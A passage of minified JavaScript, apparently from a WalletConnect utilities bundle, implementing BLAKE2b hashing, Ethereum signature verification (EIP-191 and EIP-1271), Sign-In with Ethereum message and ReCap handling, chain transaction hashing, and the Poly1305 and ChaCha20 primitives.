                this.v2l = 0 | o,
                this.v2h = 0 | i,
                this.v3l = 0 | s,
                this.v3h = 0 | a,
                this.v4l = 0 | c,
                this.v4h = 0 | l,
                this.v5l = 0 | u,
                this.v5h = 0 | d,
                this.v6l = 0 | h,
                this.v6h = 0 | f,
                this.v7l = 0 | p,
                this.v7h = 0 | g
            }
            compress(e, t, r) {
                this.get().forEach(( (e, t) => Hd[t] = e)),
                Hd.set(Vd, 16);
                let {h: n, l: o} = Eu(BigInt(this.length));
                Hd[24] = Vd[8] ^ o,
                Hd[25] = Vd[9] ^ n,
                r && (Hd[28] = ~Hd[28],
                Hd[29] = ~Hd[29]);
                let i = 0;
                const s = zd;
                for (let a = 0; a < 12; a++)
                    qd(0, 4, 8, 12, e, t + 2 * s[i++]),
                    Gd(0, 4, 8, 12, e, t + 2 * s[i++]),
                    qd(1, 5, 9, 13, e, t + 2 * s[i++]),
                    Gd(1, 5, 9, 13, e, t + 2 * s[i++]),
                    qd(2, 6, 10, 14, e, t + 2 * s[i++]),
                    Gd(2, 6, 10, 14, e, t + 2 * s[i++]),
                    qd(3, 7, 11, 15, e, t + 2 * s[i++]),
                    Gd(3, 7, 11, 15, e, t + 2 * s[i++]),
                    qd(0, 5, 10, 15, e, t + 2 * s[i++]),
                    Gd(0, 5, 10, 15, e, t + 2 * s[i++]),
                    qd(1, 6, 11, 12, e, t + 2 * s[i++]),
                    Gd(1, 6, 11, 12, e, t + 2 * s[i++]),
                    qd(2, 7, 8, 13, e, t + 2 * s[i++]),
                    Gd(2, 7, 8, 13, e, t + 2 * s[i++]),
                    qd(3, 4, 9, 14, e, t + 2 * s[i++]),
                    Gd(3, 4, 9, 14, e, t + 2 * s[i++]);
                this.v0l ^= Hd[0] ^ Hd[16],
                this.v0h ^= Hd[1] ^ Hd[17],
                this.v1l ^= Hd[2] ^ Hd[18],
                this.v1h ^= Hd[3] ^ Hd[19],
                this.v2l ^= Hd[4] ^ Hd[20],
                this.v2h ^= Hd[5] ^ Hd[21],
                this.v3l ^= Hd[6] ^ Hd[22],
                this.v3h ^= Hd[7] ^ Hd[23],
                this.v4l ^= Hd[8] ^ Hd[24],
                this.v4h ^= Hd[9] ^ Hd[25],
                this.v5l ^= Hd[10] ^ Hd[26],
                this.v5h ^= Hd[11] ^ Hd[27],
                this.v6l ^= Hd[12] ^ Hd[28],
                this.v6h ^= Hd[13] ^ Hd[29],
                this.v7l ^= Hd[14] ^ Hd[30],
                this.v7h ^= Hd[15] ^ Hd[31],
                $u(Hd)
            }
            destroy() {
                this.destroyed = !0,
                $u(this.buffer32),
                this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
            }
        }
        const Zd = function(e) {
            const t = (t, r) => e(r).update(ed(t)).digest()
              , r = e({});
            return t.outputLen = r.outputLen,
            t.blockLen = r.blockLen,
            t.create = t => e(t),
            t
        }((e => new Kd(e)))
          , Yd = "https://rpc.walletconnect.org/v1";
        function Jd(e) {
            const t = "\x19Ethereum Signed Message:\n".concat(e.length)
              , r = (new TextEncoder).encode(t + e);
            return "0x" + Buffer.from(vd(r)).toString("hex")
        }
        async function Xd(e, t, r, n, o, i) {
            switch (r.t) {
            case "eip191":
                return await async function(e, t, r) {
                    return (await Ls({
                        hash: Jd(t),
                        signature: r
                    })).toLowerCase() === e.toLowerCase()
                }(e, t, r.s);
            case "eip1271":
                return await async function(e, t, r, n, o, i) {
                    const s = Ml(n);
                    if (!s.namespace || !s.reference)
                        throw new Error("isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ".concat(n));
                    try {
                        const s = "0x1626ba7e"
                          , a = "0000000000000000000000000000000000000000000000000000000000000040"
                          , c = "0000000000000000000000000000000000000000000000000000000000000041"
                          , l = r.substring(2)
                          , u = s + Jd(t).substring(2) + a + c + l
                          , d = await fetch("".concat(i || Yd, "/?chainId=").concat(n, "&projectId=").concat(o), {
                            method: "POST",
                            body: JSON.stringify({
                                id: Qd(),
                                jsonrpc: "2.0",
                                method: "eth_call",
                                params: [{
                                    to: e,
                                    data: u
                                }, "latest"]
                            })
                        })
                          , {result: h} = await d.json();
                        return !!h && h.slice(0, s.length).toLowerCase() === s.toLowerCase()
                    } catch (ct) {
                        return console.error("isValidEip1271Signature: ", ct),
                        !1
                    }
                }(e, t, r.s, n, o, i);
            default:
                throw new Error("verifySignature failed: Attempted to verify CacaoSignature with unknown type: ".concat(r.t))
            }
        }
        function Qd() {
            return Date.now() + Math.floor(1e3 * Math.random())
        }
        function eh(e) {
            const t = new Uint8Array(Buffer.from(e, "base64"))
              , r = Array.from("TransactionData::").map((e => e.charCodeAt(0)))
              , n = new Uint8Array(r.length + t.length);
            n.set(r),
            n.set(t, r.length);
            const o = Zd(n, {
                dkLen: 32
            });
            return zs.encode(o)
        }
        function th(e) {
            const t = new Uint8Array(Ud(function(e) {
                if (e instanceof Uint8Array)
                    return e;
                if (Array.isArray(e))
                    return new Uint8Array(e);
                if ("object" == typeof e && null != e && e.data)
                    return new Uint8Array(Object.values(e.data));
                if ("object" == typeof e && e)
                    return new Uint8Array(Object.values(e));
                throw new Error("getNearUint8ArrayFromBytes: Unexpected result type from bytes array")
            }(e)));
            return zs.encode(t)
        }
        function rh(e) {
            const t = Buffer.from(e, "base64")
              , r = (n = t,
            new va(o).decode(n)).txn;
            var n, o;
            if (!r)
                throw new Error("Invalid signed transaction: missing 'txn' field");
            const i = function(e, t) {
                return new wa(t).encodeSharedRef(e)
            }(r)
              , s = Buffer.from("TX")
              , a = Buffer.concat([s, Buffer.from(i)])
              , c = jd(a);
            return Va.encode(c).replace(/=+$/, "")
        }
        function nh(e) {
            const t = [];
            let r = BigInt(e);
            for (; r >= BigInt(128); )
                t.push(Number(r & BigInt(127) | BigInt(128))),
                r >>= BigInt(7);
            return t.push(Number(r)),
            Buffer.from(t)
        }
        function oh(e) {
            const t = Buffer.from(e.signed.bodyBytes, "base64")
              , r = Buffer.from(e.signed.authInfoBytes, "base64")
              , n = Buffer.from(e.signature.signature, "base64")
              , o = [];
            o.push(Buffer.from([10])),
            o.push(nh(t.length)),
            o.push(t),
            o.push(Buffer.from([18])),
            o.push(nh(r.length)),
            o.push(r),
            o.push(Buffer.from([26])),
            o.push(nh(n.length)),
            o.push(n);
            const i = Buffer.concat(o)
              , s = Ud(i);
            return Buffer.from(s).toString("hex").toUpperCase()
        }
        var ih = Object.defineProperty
          , sh = Object.defineProperties
          , ah = Object.getOwnPropertyDescriptors
          , ch = Object.getOwnPropertySymbols
          , lh = Object.prototype.hasOwnProperty
          , uh = Object.prototype.propertyIsEnumerable
          , dh = (e, t, r) => t in e ? ih(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , hh = (e, t) => {
            for (var r in t || (t = {}))
                lh.call(t, r) && dh(e, r, t[r]);
            if (ch)
                for (var r of ch(t))
                    uh.call(t, r) && dh(e, r, t[r]);
            return e
        }
          , fh = (e, t) => sh(e, ah(t));
        const ph = e => null === e || void 0 === e ? void 0 : e.split(":")
          , gh = e => {
            const t = e && ph(e);
            if (t)
                return t[2] + ":" + t[3]
        }
          , yh = e => {
            const t = e && ph(e);
            if (t)
                return t.pop()
        }
        ;
        async function mh(e) {
            const {cacao: t, projectId: r} = e
              , {s: n, p: o} = t
              , i = bh(o, o.iss)
              , s = yh(o.iss);
            return await Xd(s, i, n, gh(o.iss), r)
        }
        const bh = (e, t) => {
            const r = "".concat(e.domain, " wants you to sign in with your Ethereum account:")
              , n = yh(t);
            if (!e.aud && !e.uri)
                throw new Error("Either `aud` or `uri` is required to construct the message");
            let o = e.statement || void 0;
            const i = "URI: ".concat(e.aud || e.uri)
              , s = "Version: ".concat(e.version)
              , a = "Chain ID: ".concat((e => {
                const t = e && ph(e);
                if (t)
                    return e.includes("did:pkh:") ? t[3] : t[1]
            }
            )(t))
              , c = "Nonce: ".concat(e.nonce)
              , l = "Issued At: ".concat(e.iat)
              , u = e.exp ? "Expiration Time: ".concat(e.exp) : void 0
              , d = e.nbf ? "Not Before: ".concat(e.nbf) : void 0
              , h = e.requestId ? "Request ID: ".concat(e.requestId) : void 0
              , f = e.resources ? "Resources:".concat(e.resources.map((e => "\n- ".concat(e))).join("")) : void 0
              , p = xh(e.resources);
            if (p) {
                o = Sh(o, Ah(p))
            }
            return [r, n, "", o, "", i, s, a, c, l, u, d, h, f].filter((e => null != e)).join("\n")
        }
        ;
        function vh(e) {
            if (!e)
                throw new Error("No recap provided, value is undefined");
            if (!e.att)
                throw new Error("No `att` property found");
            const t = Object.keys(e.att);
            if (null == t || !t.length)
                throw new Error("No resources found in `att` property");
            t.forEach((t => {
                const r = e.att[t];
                if (Array.isArray(r))
                    throw new Error("Resource must be an object: ".concat(t));
                if ("object" != typeof r)
                    throw new Error("Resource must be an object: ".concat(t));
                if (!Object.keys(r).length)
                    throw new Error("Resource object is empty: ".concat(t));
                Object.keys(r).forEach((e => {
                    const t = r[e];
                    if (!Array.isArray(t))
                        throw new Error("Ability limits ".concat(e, " must be an array of objects, found: ").concat(t));
                    if (!t.length)
                        throw new Error("Value of ".concat(e, " is empty array, must be an array with objects"));
                    t.forEach((t => {
                        if ("object" != typeof t)
                            throw new Error("Ability limits (".concat(e, ") must be an array of objects, found: ").concat(t))
                    }
                    ))
                }
                ))
            }
            ))
        }
        function wh(e, t) {
            var r;
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
            t = null === (r = t) || void 0 === r ? void 0 : r.sort(( (e, t) => e.localeCompare(t)));
            const o = t.map((t => ({
                ["".concat(e, "/").concat(t)]: [n]
            })));
            return Object.assign({}, ...o)
        }
        function Th(e) {
            return vh(e),
            "urn:recap:".concat(function(e) {
                return Buffer.from(JSON.stringify(e)).toString("base64")
            }(e).replace(/=/g, ""))
        }
        function Ah(e) {
            const t = function(e) {
                return JSON.parse(Buffer.from(e, "base64").toString("utf-8"))
            }(e.replace("urn:recap:", ""));
            return vh(t),
            t
        }
        function Eh(e, t, r) {
            const n = function(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                return null !== r && void 0 !== r && r.sort(( (e, t) => e.localeCompare(t))),
                {
                    att: {
                        [e]: wh(t, r, n)
                    }
                }
            }(e, t, r);
            return Th(n)
        }
        function Ph(e) {
            return e && e.includes("urn:recap:")
        }
        function Ch(e, t) {
            const r = function(e, t) {
                vh(e),
                vh(t);
                const r = Object.keys(e.att).concat(Object.keys(t.att)).sort(( (e, t) => e.localeCompare(t)))
                  , n = {
                    att: {}
                };
                return r.forEach((r => {
                    var o, i;
                    Object.keys((null == (o = e.att) ? void 0 : o[r]) || {}).concat(Object.keys((null == (i = t.att) ? void 0 : i[r]) || {})).sort(( (e, t) => e.localeCompare(t))).forEach((o => {
                        var i, s;
                        n.att[r] = fh(hh({}, n.att[r]), {
                            [o]: (null == (i = e.att[r]) ? void 0 : i[o]) || (null == (s = t.att[r]) ? void 0 : s[o])
                        })
                    }
                    ))
                }
                )),
                n
            }(Ah(e), Ah(t));
            return Th(r)
        }
        function Sh() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ""
              , t = arguments.length > 1 ? arguments[1] : void 0;
            vh(t);
            const r = "I further authorize the stated URI to perform the following actions on my behalf: ";
            if (e.includes(r))
                return e;
            const n = [];
            let o = 0;
            Object.keys(t.att).forEach((e => {
                const r = Object.keys(t.att[e]).map((e => ({
                    ability: e.split("/")[0],
                    action: e.split("/")[1]
                })));
                r.sort(( (e, t) => e.action.localeCompare(t.action)));
                const i = {};
                r.forEach((e => {
                    i[e.ability] || (i[e.ability] = []),
                    i[e.ability].push(e.action)
                }
                ));
                const s = Object.keys(i).map((t => (o++,
                "(".concat(o, ") '").concat(t, "': '").concat(i[t].join("', '"), "' for '").concat(e, "'."))));
                n.push(s.join(", ").replace(".,", "."))
            }
            ));
            const i = n.join(" ")
              , s = "".concat(r).concat(i);
            return "".concat(e ? e + " " : "").concat(s)
        }
        function Ih(e) {
            var t;
            const r = Ah(e);
            vh(r);
            const n = null == (t = r.att) ? void 0 : t.eip155;
            return n ? Object.keys(n).map((e => e.split("/")[1])) : []
        }
        function Bh(e) {
            const t = Ah(e);
            vh(t);
            const r = [];
            return Object.values(t.att).forEach((e => {
                Object.values(e).forEach((e => {
                    var t;
                    null != (t = null === e || void 0 === e ? void 0 : e[0]) && t.chains && r.push(e[0].chains)
                }
                ))
            }
            )),
            [...new Set(r.flat())]
        }
        function xh(e) {
            if (!e)
                return;
            const t = null === e || void 0 === e ? void 0 : e[e.length - 1];
            return Ph(t) ? t : void 0
        }
        function Oh(e) {
            return e instanceof Uint8Array || ArrayBuffer.isView(e) && "Uint8Array" === e.constructor.name
        }
        function _h(e) {
            if ("boolean" != typeof e)
                throw new Error("boolean expected, not ".concat(e))
        }
        function Wh(e) {
            if (!Number.isSafeInteger(e) || e < 0)
                throw new Error("positive integer expected, got " + e)
        }
        function Rh(e) {
            if (!Oh(e))
                throw new Error("Uint8Array expected");
            for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                r[n - 1] = arguments[n];
            if (r.length > 0 && !r.includes(e.length))
                throw new Error("Uint8Array expected of length " + r + ", got length=" + e.length)
        }
        function kh(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
            if (t && e.finished)
                throw new Error("Hash#digest() has already been called")
        }
        function Mh(e) {
            return new Uint32Array(e.buffer,e.byteOffset,Math.floor(e.byteLength / 4))
        }
        function Nh() {
            for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                t[r] = arguments[r];
            for (let n = 0; n < t.length; n++)
                t[n].fill(0)
        }
        const Fh = 68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0];
        function Uh(e) {
            if ("string" == typeof e)
                e = function(e) {
                    if ("string" != typeof e)
                        throw new Error("string expected");
                    return new Uint8Array((new TextEncoder).encode(e))
                }(e);
            else {
                if (!Oh(e))
                    throw new Error("Uint8Array expected, got " + typeof e);
                e = zh(e)
            }
            return e
        }
        function Dh(e, t) {
            let r = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
            if (void 0 === t)
                return new Uint8Array(e);
            if (t.length !== e)
                throw new Error("invalid output length, expected " + e + ", got: " + t.length);
            if (r && !function(e) {
                return e.byteOffset % 4 === 0
            }(t))
                throw new Error("invalid output, must be aligned");
            return t
        }
        function Lh(e, t, r, n) {
            if ("function" == typeof e.setBigUint64)
                return e.setBigUint64(t, r, n);
            const o = BigInt(32)
              , i = BigInt(4294967295)
              , s = Number(r >> o & i)
              , a = Number(r & i)
              , c = n ? 4 : 0
              , l = n ? 0 : 4;
            e.setUint32(t + c, s, n),
            e.setUint32(t + l, a, n)
        }
        function jh(e, t, r) {
            _h(r);
            const n = new Uint8Array(16)
              , o = function(e) {
                return new DataView(e.buffer,e.byteOffset,e.byteLength)
            }(n);
            return Lh(o, 0, BigInt(t), r),
            Lh(o, 8, BigInt(e), r),
            n
        }
        function zh(e) {
            return Uint8Array.from(e)
        }
        const Vh = e => Uint8Array.from(e.split("").map((e => e.charCodeAt(0))))
          , Hh = Vh("expand 16-byte k")
          , qh = Vh("expand 32-byte k")
          , Gh = Mh(Hh)
          , $h = Mh(qh);
        function Kh(e, t) {
            return e << t | e >>> 32 - t
        }
        function Zh(e) {
            return e.byteOffset % 4 === 0
        }
        const Yh = 2 ** 32 - 1
          , Jh = new Uint32Array;
        const Xh = (e, t) => 255 & e[t++] | (255 & e[t++]) << 8;
        class Qh {
            constructor(e) {
                this.blockLen = 16,
                this.outputLen = 16,
                this.buffer = new Uint8Array(16),
                this.r = new Uint16Array(10),
                this.h = new Uint16Array(10),
                this.pad = new Uint16Array(8),
                this.pos = 0,
                this.finished = !1,
                Rh(e = Uh(e), 32);
                const t = Xh(e, 0)
                  , r = Xh(e, 2)
                  , n = Xh(e, 4)
                  , o = Xh(e, 6)
                  , i = Xh(e, 8)
                  , s = Xh(e, 10)
                  , a = Xh(e, 12)
                  , c = Xh(e, 14);
                this.r[0] = 8191 & t,
                this.r[1] = 8191 & (t >>> 13 | r << 3),
                this.r[2] = 7939 & (r >>> 10 | n << 6),
                this.r[3] = 8191 & (n >>> 7 | o << 9),
                this.r[4] = 255 & (o >>> 4 | i << 12),
                this.r[5] = i >>> 1 & 8190,
                this.r[6] = 8191 & (i >>> 14 | s << 2),
                this.r[7] = 8065 & (s >>> 11 | a << 5),
                this.r[8] = 8191 & (a >>> 8 | c << 8),
                this.r[9] = c >>> 5 & 127;
                for (let l = 0; l < 8; l++)
                    this.pad[l] = Xh(e, 16 + 2 * l)
            }
            process(e, t) {
                const r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2] ? 0 : 2048
                  , {h: n, r: o} = this
                  , i = o[0]
                  , s = o[1]
                  , a = o[2]
                  , c = o[3]
                  , l = o[4]
                  , u = o[5]
                  , d = o[6]
                  , h = o[7]
                  , f = o[8]
                  , p = o[9]
                  , g = Xh(e, t + 0)
                  , y = Xh(e, t + 2)
                  , m = Xh(e, t + 4)
                  , b = Xh(e, t + 6)
                  , v = Xh(e, t + 8)
                  , w = Xh(e, t + 10)
                  , T = Xh(e, t + 12)
                  , A = Xh(e, t + 14);
                let E = n[0] + (8191 & g)
                  , P = n[1] + (8191 & (g >>> 13 | y << 3))
                  , C = n[2] + (8191 & (y >>> 10 | m << 6))
                  , S = n[3] + (8191 & (m >>> 7 | b << 9))
                  , I = n[4] + (8191 & (b >>> 4 | v << 12))
                  , B = n[5] + (v >>> 1 & 8191)
                  , x = n[6] + (8191 & (v >>> 14 | w << 2))
                  , O = n[7] + (8191 & (w >>> 11 | T << 5))
                  , _ = n[8] + (8191 & (T >>> 8 | A << 8))
                  , W = n[9] + (A >>> 5 | r)
                  , R = 0
                  , k = R + E * i + P * (5 * p) + C * (5 * f) + S * (5 * h) + I * (5 * d);
                R = k >>> 13,
                k &= 8191,
                k += B * (5 * u) + x * (5 * l) + O * (5 * c) + _ * (5 * a) + W * (5 * s),
                R += k >>> 13,
                k &= 8191;
                let M = R + E * s + P * i + C * (5 * p) + S * (5 * f) + I * (5 * h);
                R = M >>> 13,
                M &= 8191,
                M += B * (5 * d) + x * (5 * u) + O * (5 * l) + _ * (5 * c) + W * (5 * a),
                R += M >>> 13,
                M &= 8191;
                let N = R + E * a + P * s + C * i + S * (5 * p) + I * (5 * f);
                R = N >>> 13,
                N &= 8191,
                N += B * (5 * h) + x * (5 * d) + O * (5 * u) + _ * (5 * l) + W * (5 * c),
                R += N >>> 13,
                N &= 8191;
                let F = R + E * c + P * a + C * s + S * i + I * (5 * p);
                R = F >>> 13,
                F &= 8191,
                F += B * (5 * f) + x * (5 * h) + O * (5 * d) + _ * (5 * u) + W * (5 * l),
                R += F >>> 13,
                F &= 8191;
                let U = R + E * l + P * c + C * a + S * s + I * i;
                R = U >>> 13,
                U &= 8191,
                U += B * (5 * p) + x * (5 * f) + O * (5 * h) + _ * (5 * d) + W * (5 * u),
                R += U >>> 13,
                U &= 8191;
                let D = R + E * u + P * l + C * c + S * a + I * s;
                R = D >>> 13,
                D &= 8191,
                D += B * i + x * (5 * p) + O * (5 * f) + _ * (5 * h) + W * (5 * d),
                R += D >>> 13,
                D &= 8191;
                let L = R + E * d + P * u + C * l + S * c + I * a;
                R = L >>> 13,
                L &= 8191,
                L += B * s + x * i + O * (5 * p) + _ * (5 * f) + W * (5 * h),
                R += L >>> 13,
                L &= 8191;
                let j = R + E * h + P * d + C * u + S * l + I * c;
                R = j >>> 13,
                j &= 8191,
                j += B * a + x * s + O * i + _ * (5 * p) + W * (5 * f),
                R += j >>> 13,
                j &= 8191;
                let z = R + E * f + P * h + C * d + S * u + I * l;
                R = z >>> 13,
                z &= 8191,
                z += B * c + x * a + O * s + _ * i + W * (5 * p),
                R += z >>> 13,
                z &= 8191;
                let V = R + E * p + P * f + C * h + S * d + I * u;
                R = V >>> 13,
                V &= 8191,
                V += B * l + x * c + O * a + _ * s + W * i,
                R += V >>> 13,
                V &= 8191,
                R = (R << 2) + R | 0,
                R = R + k | 0,
                k = 8191 & R,
                R >>>= 13,
                M += R,
                n[0] = k,
                n[1] = M,
                n[2] = N,
                n[3] = F,
                n[4] = U,
                n[5] = D,
                n[6] = L,
                n[7] = j,
                n[8] = z,
                n[9] = V
            }
            finalize() {
                const {h: e, pad: t} = this
                  , r = new Uint16Array(10);
                let n = e[1] >>> 13;
                e[1] &= 8191;
                for (let s = 2; s < 10; s++)
                    e[s] += n,
                    n = e[s] >>> 13,
                    e[s] &= 8191;
                e[0] += 5 * n,
                n = e[0] >>> 13,
                e[0] &= 8191,
                e[1] += n,
                n = e[1] >>> 13,
                e[1] &= 8191,
                e[2] += n,
                r[0] = e[0] + 5,
                n = r[0] >>> 13,
                r[0] &= 8191;
                for (let s = 1; s < 10; s++)
                    r[s] = e[s] + n,
                    n = r[s] >>> 13,
                    r[s] &= 8191;
                r[9] -= 8192;
                let o = (1 ^ n) - 1;
                for (let s = 0; s < 10; s++)
                    r[s] &= o;
                o = ~o;
                for (let s = 0; s < 10; s++)
                    e[s] = e[s] & o | r[s];
                e[0] = 65535 & (e[0] | e[1] << 13),
                e[1] = 65535 & (e[1] >>> 3 | e[2] << 10),
                e[2] = 65535 & (e[2] >>> 6 | e[3] << 7),
                e[3] = 65535 & (e[3] >>> 9 | e[4] << 4),
                e[4] = 65535 & (e[4] >>> 12 | e[5] << 1 | e[6] << 14),
                e[5] = 65535 & (e[6] >>> 2 | e[7] << 11),
                e[6] = 65535 & (e[7] >>> 5 | e[8] << 8),
                e[7] = 65535 & (e[8] >>> 8 | e[9] << 5);
                let i = e[0] + t[0];
                e[0] = 65535 & i;
                for (let s = 1; s < 8; s++)
                    i = (e[s] + t[s] | 0) + (i >>> 16) | 0,
                    e[s] = 65535 & i;
                Nh(r)
            }
            update(e) {
                kh(this),
                Rh(e = Uh(e));
                const {buffer: t, blockLen: r} = this
                  , n = e.length;
                for (let o = 0; o < n; ) {
                    const i = Math.min(r - this.pos, n - o);
                    if (i !== r)
                        t.set(e.subarray(o, o + i), this.pos),
                        this.pos += i,
                        o += i,
                        this.pos === r && (this.process(t, 0, !1),
                        this.pos = 0);
                    else
                        for (; r <= n - o; o += r)
                            this.process(e, o)
                }
                return this
            }
            destroy() {
                Nh(this.h, this.r, this.buffer, this.pad)
            }
            digestInto(e) {
                kh(this),
                function(e, t) {
                    Rh(e);
                    const r = t.outputLen;
                    if (e.length < r)
                        throw new Error("digestInto() expects output buffer of length at least " + r)
                }(e, this),
                this.finished = !0;
                const {buffer: t, h: r} = this;
                let {pos: n} = this;
                if (n) {
                    for (t[n++] = 1; n < 16; n++)
                        t[n] = 0;
                    this.process(t, 0, !0)
                }
                this.finalize();
                let o = 0;
                for (let i = 0; i < 8; i++)
                    e[o++] = r[i] >>> 0,
                    e[o++] = r[i] >>> 8;
                return e
            }
            digest() {
                const {buffer: e, outputLen: t} = this;
                this.digestInto(e);
                const r = e.slice(0, t);
                return this.destroy(),
                r
            }
        }
        const ef = function(e) {
            const t = (t, r) => e(r).update(Uh(t)).digest()
              , r = e(new Uint8Array(32));
            return t.outputLen = r.outputLen,
            t.blockLen = r.blockLen,
            t.create = t => e(t),
            t
        }((e => new Qh(e)));
        const tf = function(e, t) {
            const {allowShortKeys: r, extendNonceFn: n, counterLength: o, counterRight: i, rounds: s} = function(e, t) {
                if (null == t || "object" != typeof t)
                    throw new Error("options must be defined");
                return Object.assign(e, t)
            }({
                allowShortKeys: !1,
                counterLength: 8,
                counterRight: !1,
                rounds: 20
            }, t);
            if ("function" != typeof e)
                throw new Error("core must be a function");
            return Wh(o),
            Wh(s),
            _h(i),
            _h(r),
            function(t, a, c, l) {
                let u = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : 0;
                Rh(t),
                Rh(a),
                Rh(c);
                const d = c.length;
                if (void 0 === l && (l = new Uint8Array(d)),
                Rh(l),
                Wh(u),
                u < 0 || u >= Yh)
                    throw new Error("arx: counter overflow");
                if (l.length < d)
                    throw new Error("arx: output (".concat(l.length, ") is shorter than data (").concat(d, ")"));
                const h = [];
                let f, p, g = t.length;
                if (32 === g)
                    h.push(f = zh(t)),
                    p = $h;
                else {
                    if (16 !== g || !r)
                        throw new Error("arx: invalid 32-byte key, got length=".concat(g));
                    f = new Uint8Array(32),
                    f.set(t),
                    f.set(t, 16),
                    p = Gh,
                    h.push(f)
                }
                Zh(a) || h.push(a = zh(a));
                const y = Mh(f);
                if (n) {
                    if (24 !== a.length)
                        throw new Error("arx: extended nonce must be 24 bytes");
                    n(p, y, Mh(a.subarray(0, 16)), y),
                    a = a.subarray(16)
                }
                const m = 16 - o;
                if (m !== a.length)
                    throw new Error("arx: nonce must be ".concat(m, " or 16 bytes"));
                if (12 !== m) {
                    const e = new Uint8Array(12);
                    e.set(a, i ? 0 : 12 - a.length),
                    a = e,
                    h.push(a)
                }
                const b = Mh(a);
                return function(e, t, r, n, o, i, s, a) {
                    const c = o.length
                      , l = new Uint8Array(64)
                      , u = Mh(l)
                      , d = Zh(o) && Zh(i)
                      , h = d ? Mh(o) : Jh
                      , f = d ? Mh(i) : Jh;
                    for (let p = 0; p < c; s++) {
                        if (e(t, r, n, u, s, a),
                        s >= Yh)
                            throw new Error("arx: counter overflow");
                        const g = Math.min(64, c - p);
                        if (d && 64 === g) {
                            const e = p / 4;
                            if (p % 4 !== 0)
                                throw new Error("arx: invalid block position");
                            for (let t, r = 0; r < 16; r++)
                                t = e + r,
                                f[t] = h[t] ^ u[r];
                            p += 64
                        } else {
                            for (let e, t = 0; t < g; t++)
                                e = p + t,
                                i[e] = o[e] ^ l[t];
                            p += g
                        }
                    }
                }(e, p, y, b, c, l, u, s),
                Nh(...h),
                l
            }
        }((function(e, t, r, n, o) {
            let i = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : 20
              , s = e[0]
              , a = e[1]
              , c = e[2]
              , l = e[3]
              , u = t[0]
              , d = t[1]
              , h = t[2]
              , f = t[3]
              , p = t[4]
              , g = t[5]
              , y = t[6]
              , m = t[7]
              , b = o
              , v = r[0]
              , w = r[1]
              , T = r[2]
              , A = s
              , E = a
              , P = c
              , C = l
              , S = u
              , I = d
              , B = h
              , x = f
              , O = p
              , _ = g
              , W = y
              , R = m
              , k = b
              , M = v
              , N = w
              , F = T;
            for (let D = 0; D < i; D += 2)
                A = A + S | 0,
                k = Kh(k ^ A, 16),
                O = O + k | 0,
                S = Kh(S ^ O, 12),
                A = A + S | 0,
                k = Kh(k ^ A, 8),
                O = O + k | 0,
                S = Kh(S ^ O, 7),
                E = E + I | 0,
                M = Kh(M ^ E, 16),
                _ = _ + M | 0,
                I = Kh(I ^ _, 12),
                E = E + I | 0,
                M = Kh(M ^ E, 8),
                _ = _ + M | 0,
                I = Kh(I ^ _, 7),
                P = P + B | 0,
                N = Kh(N ^ P, 16),
                W = W + N | 0,
                B = Kh(B ^ W, 12),
                P = P + B | 0,
                N = Kh(N ^ P, 8),
                W = W + N | 0,
                B = Kh(B ^ W, 7),
                C = C + x | 0,
                F = Kh(F ^ C, 16),
                R = R + F | 0,
                x = Kh(x ^ R, 12),
                C = C + x | 0,
                F = Kh(F ^ C, 8),
                R = R + F | 0,
                x = Kh(x ^ R, 7),
                A = A + I | 0,
                F = Kh(F ^ A, 16),
                W = W + F | 0,
                I = Kh(I ^ W, 12),
                A = A + I | 0,
                F = Kh(F ^ A, 8),
                W = W + F | 0,
                I = Kh(I ^ W, 7),
                E = E + B | 0,
                k = Kh(k ^ E, 16),
                R = R + k | 0,
                B = Kh(B ^ R, 12),
                E = E + B | 0,
                k = Kh(k ^ E, 8),
                R = R + k | 0,
                B = Kh(B ^ R, 7),
                P = P + x | 0,
                M = Kh(M ^ P, 16),
                O = O + M | 0,
                x = Kh(x ^ O, 12),
                P = P + x | 0,
                M = Kh(M ^ P, 8),
                O = O + M | 0,
                x = Kh(x ^ O, 7),
                C = C + S | 0,
                N = Kh(N ^ C, 16),
                _ = _ + N | 0,
                S = Kh(S ^ _, 12),
                C = C + S | 0,
                N = Kh(N ^ C, 8),
                _ = _ + N | 0,
                S = Kh(S ^ _, 7);
            let U = 0;
            n[U++] = s + A | 0,
            n[U++] = a + E | 0,
            n[U++] = c + P | 0,
            n[U++] = l + C | 0,
            n[U++] = u + S | 0,
            n[U++] = d + I | 0,
            n[U++] = h + B | 0,
            n[U++] = f + x | 0,
            n[U++] = p + O | 0,
            n[U++] = g + _ | 0,
            n[U++] = y + W | 0,
            n[U++] = m + R | 0,
            n[U++] = b + k | 0,
            n[U++] = v + M | 0,
            n[U++] = w + N | 0,
            n[U++] = T + F | 0
        }
        ), {
            counterRight: !1,
            counterLength: 4,
            allowShortKeys: !1
        })
          , rf = new Uint8Array(16)
          , nf = (e, t) => {
            e.update(t);
            const r = t.length % 16;
            r && e.update(rf.subarray(r))
        }
          , of = new Uint8Array(32);
        function sf(e, t, r, n, o) {
            const i = e(t, r, of)
              , s = ef.create(i);
            o && nf(s, o),
            nf(s, n);
            const a = jh(n.length, o ? o.length : 0, !0);
            s.update(a);
            const c = s.digest();
            return Nh(i, a),
            c
        }
        const af = ( (e, t) => {
            function r(r) {
                if (Rh(r),
                !Fh)
                    throw new Error("Non little-endian hardware is not yet supported");
                for (var n = arguments.length, o = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++)
                    o[i - 1] = arguments[i];
                if (void 0 !== e.nonceLength) {
                    const t = o[0];
                    if (!t)
                        throw new Error("nonce / iv required");
                    e.varSizeNonce ? Rh(t) : Rh(t, e.nonceLength)
                }
